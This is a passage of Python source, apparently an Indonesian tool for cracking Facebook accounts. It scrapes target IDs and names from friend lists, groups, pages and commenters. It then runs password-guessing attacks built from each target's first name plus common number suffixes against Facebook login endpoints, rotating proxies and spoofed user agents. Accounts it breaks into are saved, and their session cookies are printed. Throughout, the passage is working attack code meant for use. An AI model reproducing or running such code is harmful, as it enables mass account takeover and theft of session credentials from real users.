	messeger = random.choice(user_componen['mes'])
	ip = str(random.randint(100,299)) + '.0.0.' + str(random.randint(1,99)) + '.' + str(random.randint(99,299))
	com_facebook = random.choice(user_componen['com'])
	lokasi = random.choice(user_componen['loc'])
	fbv = str(random.randint(1999999,59999999))
	face = random.choice(user_componen['fbcr'])
	model = random.choice(user_componen['model'])
	mod = random.choice(user_componen['mod'])
	jenis = random.choice(user_componen['jenis'])
	fbs = str(random.randint(1,10))
	fbs1 = str(random.randint(1,10)) + '.' + str(random.randint(0,5)) + '.' + str(random.randint(0,3))
	FBSV = random.choice([fbs,fbs1])
	densi = "{density=" + str(random.randint(1,3)) + ".0,width=" + str(random.randint(720,1920)) + ",height=" + str(random.randint(720,1920)) + "};FB_FW/1;FBRV/" + str(random.randint(19999999,499999999)) + ";]"
	ua = f"[FBAN/{messeger};FBAV/{ip};FBPN/{com_facebook};FBLC/{lokasi};FBBV/{fbv};FBCR/{face};FBMF/{model};FBBD/{mod};FBDV/{jenis};FBSV/{FBSV};FBCA/x86:armeabi-v7a;FBDM/{densi}"
	return ua


def Email():
    print("")
    prints(Panel.fit(f'\tMAIL CRACK',style='bold green'))
    print("")
    dump=[]
    rc = random.choice
    rr = random.randint
    xc = ['achmad','mas','mochammad','muhammad','jaki','juned','fikri','dika','nanang','agus','bode','acill','ilham','eka','toni','toto','bagus','bagas','joko','erik','samsul','udin','ucup','endang','dudung','putra','bondol','cecep','jamal','rifki','cicih','cucu','iis','dahlia','imas','nanda','nazwa','zahra','zahwa','fitri','neni','encin','titin','yoyoh','iin','ineke','andin','tari','ninis','nesya','firda','septi','lasma','mutia','mpit','sifa','siti','syifa','zahra','elin','mela']
    blk = ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','maulana','ramdani','ramadan','mulyana','irawan','susanto','saputra','sinaga','mulyono','wibowo','wirawan','hermawan','darmawan','hermanto','sulaeman','kurniawan','setiawan','sukaesih','aprilia','apriliani','rahayu','lestari','safitri','nurhasanah','fatimah','aisyah','nurjanah','khoerunisa','fadilah','ningsih','yuningsih','ningsih','nengsih','suningsih','yulianti','julianti','pertiwi','pratiwi','mulyani','wahyuni','hutagalung','suherni','damayanti','kartika','kartini','dimas','riski','agus','fadil','tiawan','aprianto','bimasakti','gilang','ardian','purtianto','saleh','caca','rani','puspita','santi','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','77','01','02','03','04','06','07','08','08','09','11','11']
    global ok , cc
    nama = input(f'[ × ] nama target : ')
    if ',' in str(nama):
        print(f'└─ masukan nama, jangan kosong ')
        time.sleep(3);exit()
    doma = input(f'[ × ] domain (ex:@gmail.com) : ')
    if '@' not in str(doma) or '.com' not in str(doma):
        print(f'└─ masukkan domain dengan benar ')
        time.sleep(3);exit()
    jumlah = input(f'[ × ] total dump (max:10000) : ')
    for xyz in range(int(jumlah)):
        AA = nama
        BB = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
        CC = doma
        DD = f'{AA}'
        if DD in id:pass
        else:id.append(DD+'|'+nama)
        if len(dump)==999999:auto()
        sys.stdout.write(f"\r[ + ] berhasil mengumpulkan {asu}{len(id)} {P}email...");sys.stdout.flush()
        time.sleep(0.0000003)
    print("")
    setting()	
	

def crack_file():
    file = input(f'Masukan Nama File Yang Di Sdcard Anda : ')
    try:
        uuid = open(file,'r').readlines()
        for data in uuid:
            try:id.append(data)
            except:exit(f" [{M}>{P}] pemisah salah")
            print('\r sedang dump %s id'%(len(id)),end=" ")
            time.sleep(0.0000003)
    except FileNotFoundError:exit(f"File Tidak Terbaca")
    print(f'\rtotal jumlah akun dump adalah {len(id)}')
    setting()
    
###----------[ DUMP ID PUBLIK ]----------###
def dump():
    with requests.Session() as ses:
        token = open(".token.txt", "r").read()
        cok = open(".cookie.txt", "r").read()
        prints(Panel(f"{P2}Masukan id target, pastikan id target bersifat publik",width=60,style=f"blue"))
        a = console.input(f" {H2}• {P2}Masukan Id Target : ")
        if a in ["me", "Me", "ME"]:
            try:
                koH = requests.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for pi in koH["friends"]["data"]:
                    try:
                        id.append(pi["id"] + "|" + pi["name"])
                    except:
                        continue
                setting()
            except Exception as d:
                print(d)
        else:
            try:
                b = ses.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for c in b["friends"]["data"]:
                    id.append(c["id"] + "|" + c["name"])
                setting()
            except Exception as e:
                print(e)
    

###----------[ ATUR SBLUM KREK ]----------###
def setting():
    prints(Panel.fit(f"[bold white]Akun yang terkumpul adalah ' [bold green]{len(id)}[bold white] '",style="blue"))
    prints(Panel(f"[bold white]1. Crack Account  \n2. Crack Account New  \n3. Crack Account Random ",style='blue'))
    Al_alya = input(f"[ > ] masukan pilihan menu : ")
    if '1' in Al_alya:
        for tua in sorted(id):
            id2.append(tua)
    elif '2' in Al_alya:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif '3' in Al_alya:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:print('╰─ input correctly ');exit()
    prints(Panel.fit(f"[bold white]1. Metode Account Reguler Api V1 [ Data selain telkom ]",style='blue'))
    prints(Panel.fit(f"[bold white]2. Metode Account Reguler Api V2 [ Wifi Indihome ]",style='blue'))
    Al_alya = input(f"[ > ] masukan pilihan menu : ")
    if '1' in Al_alya:
        method.append('api')
    elif '2' in Al_alya:
        method.append('valid')
    elif '3' in Al_alya:
        method.append('touch')
    else:method.append('api')
    passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
    global prog,des,loop
    print("")
    loop+=len(id)
    Cik.append(Panel(f"[bold white]OK : %s[bold white]"%(okc),style="bold green"))
    Cik.append(Panel(f"[bold white]CP : %s[bold white]"%(cpc),style="bold green"))
    console.print(Columns(Cik))
    prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('',total=len(id))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = []
                pwv = []
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                        pwv.append(frs+'1234567')
                        pwv.append(frs+'01')
                        pwv.append(frs+'02')
                        pwv.append(frs+'03')
                        pwv.append(frs+'04')
                        pwv.append(frs+'05')
                        pwv.append(frs+'06')
                        pwv.append(frs+'07')
                        pwv.append(frs+'08')
                        pwv.append(frs+'09')
                        pwv.append(frs+'10')
                        pwv.append(frs+'4321')
                        pwv.append(frs+'54321')
                        pwv.append(frs+'654321')
                        pwv.append(frs+'7654321')
                        pwv.append(frs+'12341234')
                        pwv.append(frs+'123123')
                        pwv.append(frs+'1234567890')
                        pwv.append(frs+'13')
                        pwv.append(frs+'14')
                        pwv.append(frs+'15')
                        pwv.append(frs+'16')
                        pwv.append(frs+'17')
                        pwv.append(frs+'18')
                        pwv.append(frs+'19')
                        pwv.append(frs+'20')
                        pwv.append(frs+'21')
                        pwv.append(frs+'22')
                        pwv.append(frs+'23')
                        pwv.append(frs+'24')
                        pwv.append(frs+'25')
                        pwv.append(frs+'26')
                        pwv.append(frs+'27')
                        pwv.append(frs+'28')
                        pwv.append(frs+'29')
                        pwv.append(frs+'30')
                        pwv.append(frs+'31')
                        pwv.append(frs+'32')
                        pwv.append(frs+'33')
                        pwv.append(frs+'34')
                        pwv.append(frs+'35')
                        pwv.append(frs+'36')
                        pwv.append(frs+'37')
                        pwv.append(frs+'38')
                        pwv.append(frs+'39')
                        pwv.append(frs+'40')
                        pwv.append(frs+'41')
                        pwv.append(frs+'42')
                        pwv.append(frs+'43')
                        pwv.append(frs+'44')
                        pwv.append(frs+'45')
                        pwv.append(frs+'46')
                        pwv.append(frs+'47')
                        pwv.append(frs+'48')
                        pwv.append(frs+'49')
                        pwv.append(frs+'50')
                        pwv.append(frs+'11')
                        pwv.append(frs+'22')
                        pwv.append(frs+'33')
                        pwv.append(frs+'44')
                        pwv.append(frs+'55')
                        pwv.append(frs+'66')
                        pwv.append(frs+'77')
                        pwv.append(frs+'88')
                        pwv.append(frs+'99')
                        pwv.append(frs+'111')
                        pwv.append(frs+'222')
                        pwv.append(frs+'333')
                        pwv.append(frs+'444')
                        pwv.append(frs+'555')
                        pwv.append(frs+'666')
                        pwv.append(frs+'777')
                        pwv.append(frs+'888')
                        pwv.append(frs+'999')
                        pwv.append(frs+'1111')
                        pwv.append(frs+'2222')
                        pwv.append(frs+'3333')
                        pwv.append(frs+'4444')
                        pwv.append(frs+'5555')
                        pwv.append(frs+'6666')
                        pwv.append(frs+'7777')
                        pwv.append(frs+'8888')
                        pwv.append(frs+'9999')
                        pwv.append(frs+'321')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                        pwv.append(frs+'1234567')
                        pwv.append(frs+'01')
                        pwv.append(frs+'02')
                        pwv.append(frs+'03')
                        pwv.append(frs+'04')
                        pwv.append(frs+'05')
                        pwv.append(frs+'06')
                        pwv.append(frs+'07')
                        pwv.append(frs+'08')
                        pwv.append(frs+'09')
                        pwv.append(frs+'10')
                        pwv.append(frs+'4321')
                        pwv.append(frs+'54321')
                        pwv.append(frs+'654321')
                        pwv.append(frs+'7654321')
                        pwv.append(frs+'12341234')
                        pwv.append(frs+'123123')
                        pwv.append(frs+'1234567890')
                        pwv.append(frs+'13')
                        pwv.append(frs+'14')
                        pwv.append(frs+'15')
                        pwv.append(frs+'16')
                        pwv.append(frs+'17')
                        pwv.append(frs+'18')
                        pwv.append(frs+'19')
                        pwv.append(frs+'20')
                        pwv.append(frs+'21')
                        pwv.append(frs+'22')
                        pwv.append(frs+'23')
                        pwv.append(frs+'24')
                        pwv.append(frs+'25')
                        pwv.append(frs+'26')
                        pwv.append(frs+'27')
                        pwv.append(frs+'28')
                        pwv.append(frs+'29')
                        pwv.append(frs+'30')
                        pwv.append(frs+'31')
                        pwv.append(frs+'32')
                        pwv.append(frs+'33')
                        pwv.append(frs+'34')
                        pwv.append(frs+'35')
                        pwv.append(frs+'36')
                        pwv.append(frs+'37')
                        pwv.append(frs+'38')
                        pwv.append(frs+'39')
                        pwv.append(frs+'40')
                        pwv.append(frs+'41')
                        pwv.append(frs+'42')
                        pwv.append(frs+'43')
                        pwv.append(frs+'44')
                        pwv.append(frs+'45')
                        pwv.append(frs+'46')
                        pwv.append(frs+'47')
                        pwv.append(frs+'48')
                        pwv.append(frs+'49')
                        pwv.append(frs+'50')
                        pwv.append(frs+'11')
                        pwv.append(frs+'22')
                        pwv.append(frs+'33')
                        pwv.append(frs+'44')
                        pwv.append(frs+'55')
                        pwv.append(frs+'66')
                        pwv.append(frs+'77')
                        pwv.append(frs+'88')
                        pwv.append(frs+'99')
                        pwv.append(frs+'111')
                        pwv.append(frs+'222')
                        pwv.append(frs+'333')
                        pwv.append(frs+'444')
                        pwv.append(frs+'555')
                        pwv.append(frs+'666')
                        pwv.append(frs+'777')
                        pwv.append(frs+'888')
                        pwv.append(frs+'999')
                        pwv.append(frs+'1111')
                        pwv.append(frs+'2222')
                        pwv.append(frs+'3333')
                        pwv.append(frs+'4444')
                        pwv.append(frs+'5555')
                        pwv.append(frs+'6666')
                        pwv.append(frs+'7777')
                        pwv.append(frs+'8888')
                        pwv.append(frs+'9999')
                        pwv.append(frs+'321')
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if 'api' in method:
                    pool.submit(Regulerv1,idf,pwv)
                elif 'valid' in method:
                    pool.submit(Reguler,idf,pwv)
                else:
                    pool.submit(Regulerv1,idf,pwv)
        print('')
        sys.stdout.write('Berhasil Mengcrack %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
        print('')


def Regulerv1(idf, pwv):
    global loop, ok, cp
    rr = random.randint
    ses = requests.Session()
    prog.update(des, description=f"{K2}+{H2} REGULER V1 {P2}{idf} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            url = "https://x.facebook.com/login.php?"
            req1 = ses.get(url)
            headasli = {
                'authority': 'x.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded',
                'dpr': '1.600000023841858', 'origin': 'https://x.facebook.com', 'referer': 'https://x.facebook.com/', 'accept-encoding': 'br, gzip',
                'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
                'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
                'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': ua,
                'viewport-width': '980'
            }
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', req1.text).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', req1.text).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', req1.text).group(1),
                "li": re.search('name="li" value="(.*?)"', req1.text).group(1),
                "try_number": "0", "unrecognized_tries": "0", "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point",
                "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false",
                "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw
            }
            cookie = ses.cookies.get_dict()
            post = random.choice(['https://www.facebook.com/login/device-based/regular/login/','https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9','https://m.facebook.com/login/device-based/regular/login/','https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9','https://mbasic.facebook.com/login/device-based/regular/login/','https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9','https://free.facebook.com/login/device-based/regular/login/','https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
            po = ses.post(post, headers=headasli, data=data, cookies=cookie, allow_redirects=False, proxies=proxs)
            if "checkpoint" in ses.cookies.get_dict().keys() and "checkpoint" in po.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"{K2}AKUN CHECKPOINT{P2}", style=f"yellow"))
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"yellow"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"yellow"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"yellow"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
                tree = Tree(Panel.fit(f"{H2}AKUN SUKSES {P2}", style=f"blue"))
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"blue"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"blue"))
                tree.add(Panel(f"{H2}{kuki}{P2}", style=f"blue"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop -= 1

def Reguler(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ugen) 
	ses = requests.Session()
	prog.update(des, description=f" {K2}+{H2} REGULER {P2}{idf} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des) 
	for pw in pwv:
		try:
			requ= ses.get('https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
			data = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',requ.text).group(1), "li": re.search('name="li" value="(.*?)"',requ.text).group(1), "try_number": "0", "unrecognized_tries": "0", "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point", "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false", "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw}
			head = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Referer": "https://iphone.facebook.com/", "Origin": "https://iphone.facebook.com", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "DNT": "1"}
			post = random.choice(['https://www.facebook.com/login/device-based/regular/login/','https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9','https://m.facebook.com/login/device-based/regular/login/','https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
			po = ses.post(post, headers=head, data=data, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp += 1
				tree = Tree(Panel.fit(f"{K2}AKUN CHECKPOINT{P2}", style=f"yellow"))
				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"yellow"))
				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"yellow"))
				tree.add(Panel(f"{M2}{ua}{P2}", style=f"yellow"))
				prints(tree)
				
				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok += 1
				coki = ses.cookies.get_dict()
				kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
				tree = Tree(Panel.fit(f"{H2}AKUN SUKSES {P2}", style=f"blue"))
				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"blue"))
				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"blue"))
				tree.add(Panel(f"{H2}{kuki}{P2}", style=f"blue"))
				prints(tree)
				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop-=1

import os, sys, random, json, re, concurrent
from concurrent.futures import ThreadPoolExecutor

def mod():
    global requests, bs4, bs
    try: import requests
    except Exception as e: os.system('pip install requests'); import requests
    try: import bs4
    except Exception as e: os.system('pip install bs4'); import bs4
    from bs4 import BeautifulSoup as bs

class TimelineNoLogin():
    def __init__(self,cookie=''):
        self.xyz = requests.Session()
        self.dump = 0
        self.result = []
        self.cookie = cookie
        self.ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
        self.head = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Dpr':'1.125','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':self.ua,'Viewport-Width':'924'}
        self.LandingTimeline()

    #--> Dump From Facebook Group
    def LandingTimeline(self):
        prints(Panel(f'[bold white]1. Grup\n2. Page',style='blue'))
        x = input('Pilih : ')
        print('')
        if   x in ['1','01','a']:
            typ = 'Grup'
            idt = input('Masukkan ID Grup : ')
            url = f'https://www.facebook.com/groups/{idt}' #--> 175107520598383
        elif x in ['2','02','b']:
            typ = 'Page'
            idt = input('Masukkan ID Page : ')
            url = f'https://www.facebook.com/{idt}' #--> 100069058853738
        else:
            print('Isi Yang Benar!')
            exit()
        self.data_post, self.data_scrap = self.ScrapData(url,typ)
        print('Nama %s : %s'%(typ,self.data_scrap['name']))
        self.lim = int(input('Berapa ID : '))
        print('')
        self.ScrapOverall(type=typ)

    #--> Scrap Data
    def ScrapData(self,url,type):
        try:
            req = bs(self.xyz.get(url,headers=self.head,cookies={'cookie':self.cookie},allow_redirects=True).content,'html.parser')
            data_post = {'av':re.search('__user=(.*?)&',str(req)).group(1),'__user':re.search('__user=(.*?)&',str(req)).group(1),'__a':re.search('__a=(.*?)&',str(req)).group(1),'__req':random.choice(['a','1','2','3','4','5']),'__hs':re.search('"haste_session":"(.*?)"',str(req)).group(1),'dpr':re.search('"pr":(.*?),',str(req)).group(1),'__ccg':random.choice(['EXCELLENT','GOOD']),'__rev':re.search('{"rev":(.*?)}',str(req)).group(1),'__hsi':re.search('"hsi":"(.*?)"',str(req)).group(1),'__comet_req':re.search('__comet_req=(.*?)&',str(req)).group(1),'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1),'jazoest':re.search('&jazoest=(.*?)"',str(req)).group(1),'__spin_r':re.search('"__spin_r":(.*?),',str(req)).group(1),'__spin_b':re.search('"__spin_b":"(.*?)"',str(req)).group(1),'__spin_t':re.search('"__spin_t":(.*?),',str(req)).group(1),'fb_api_caller_class':'RelayModern','server_timestamps':True}
            if type == 'Grup':
                data_scrap = {'id':re.search('"groupID":"(.*?)"',str(req)).group(1),'name':re.search('"meta":{"title":"(.*?)"',str(req)).group(1),'username':re.search('"idorvanity":"(.*?)"',str(req)).group(1),'f_location':re.search('"feedLocation":"(.*?)"',str(req)).group(1),'f_type':re.search('"feedType":"(.*?)"',str(req)).group(1)}
            elif type == 'Page':
                data_scrap = {'id':re.search('"userID":"(.*?)"',str(req)).group(1),'name':re.search('"meta":{"title":"(.*?)"',str(req)).group(1)}
            return(data_post,data_scrap)
        except Exception as e:
            print('ID Not Found or Something Went Wrong')
            exit()

    #--> Get Overall Info
    def ScrapOverall(self,type,cursor=None):
        if type == 'Grup':
            dtp, dtg = self.data_post.copy(), self.data_scrap.copy()
            var = {"UFI2CommentsProvider_commentsKey":"CometGroupDiscussionRootSuccessQuery","count":3,"cursor":cursor,"id":dtg['id'],"feedLocation":dtg['f_location'],"feedType":dtg['f_type'],"renderLocation":"group","stream_initial_count":1,"feedbackSource":0,"focusCommentID":None,"scale":1.5,"sortingSetting":None,"useDefaultActor":False,"privacySelectorRenderLocation":"COMET_STREAM","__relay_internal__pv__IsWorkUserrelayprovider":False,"__relay_internal__pv__IsMergQAPollsrelayprovider":False,"__relay_internal__pv__CometUFIIsRTAEnabledrelayprovider":False,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":False,"__relay_internal__pv__StoriesRingrelayprovider":False,"displayCommentsContextEnableComment":None,"displayCommentsContextIsAdPreview":None,"displayCommentsContextIsAggregatedShare":None,"displayCommentsContextIsStorySet":None,"displayCommentsFeedbackContext":None,}
            dtp.update({'fb_api_req_friendly_name':'GroupsCometFeedRegularStoriesPaginationQuery','variables':json.dumps(var),'doc_id':'6617440634998224'})
        elif type == 'Page':
            dtp, dtg = self.data_post.copy(), self.data_scrap.copy()
            var = {"UFI2CommentsProvider_commentsKey":"ProfileCometTimelineRoute","afterTime":None,"beforeTime":None,"count":3,"cursor":cursor,"displayCommentsContextEnableComment":None,"displayCommentsContextIsAdPreview":None,"displayCommentsContextIsAggregatedShare":None,"displayCommentsContextIsStorySet":None,"displayCommentsFeedbackContext":None,"feedLocation":"TIMELINE","feedbackSource":0,"focusCommentID":None,"memorializedSplitTimeFilter":None,"omitPinnedPost":True,"postedBy":None,"privacy":None,"privacySelectorRenderLocation":"COMET_STREAM","renderLocation":"timeline","scale":1.5,"stream_count":1,"taggedInOnly":None,"useDefaultActor":False,"id":dtg['id'],"__relay_internal__pv__IsWorkUserrelayprovider":False,"__relay_internal__pv__IsMergQAPollsrelayprovider":False,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":False,"__relay_internal__pv__CometUFIIsRTAEnabledrelayprovider":False,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":False,"__relay_internal__pv__StoriesRingrelayprovider":False}
            dtp.update({'fb_api_req_friendly_name':'ProfileCometTimelineFeedRefetchQuery','variables':json.dumps(var),'doc_id':'5689925947799218'})
        try:
            pos = self.xyz.post('https://www.facebook.com/api/graphql/',data=dtp,cookies={'cookie':self.cookie}).text
            feedback = list(set(re.findall('"feedback":{"id":"(.*?)"',str(pos))))

            with ThreadPoolExecutor(max_workers=30) as TPE:
                for x in list(set(re.findall(r'"__typename":"User","name":"(.*?)","id":"(.*?)"',str(pos)))):
                    if self.dump >= self.lim: break
                    else:
                        if 'short_name' in str(x): pass
                        else: TPE.submit(self.ScrapPost,list(x))
            #--> Submit To Comment
            with ThreadPoolExecutor(max_workers=30) as TPE:
                for fbid in feedback:
                    if self.dump >= self.lim: break
                    else: TPE.submit(self.ScrapComment,fbid)
            #--> Submit To React
            with ThreadPoolExecutor(max_workers=30) as TPE:
                for fbid in feedback:
                    if self.dump >= self.lim: break
                    else: TPE.submit(self.ScrapReact,fbid)
            if self.dump >= self.lim: pass
            else:
                try: self.ScrapOverall(type,re.search('"end_cursor":"(.*?)"',str(pos)).group(1))
                except Exception as e: pass
        except Exception as e: pass
    #--> Get ID From Who Posted In Group
    def ScrapPost(self,dat):
        try:
            ray = {'id':self.ConvertID(dat[-1]),'name':dat[0]}
            if 'pfbid' in ray['id']: pass
            else:
                if ray in self.result: pass
                else:
                    self.result.append(ray)
                    print('%s|%s'%(ray['id'],ray['name']))
                    open('dump.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                    self.dump += 1
        except Exception as e: pass
    def ScrapComment(self,fbid):
        try:
            dtp = self.data_post.copy()
            dtp.update({'fb_api_req_friendly_name':'CometUFICommentsCountTooltipContentQuery','variables':json.dumps({"feedbackTargetID":fbid}),'doc_id':'6381324631954417'})
            pos = self.xyz.post('https://www.facebook.com/api/graphql/',data=dtp,cookies={'cookie':self.cookie}).json()
            for p in pos['data']['feedback']['commenters']['edges']:
                try:
                    ray = {'id':self.ConvertID(p['node']['id']),'name':p['node']['name']}
                    if 'pfbid' in ray['id']: pass
                    else:
                        if ray in self.result: pass
                        else:
                            self.result.append(ray)
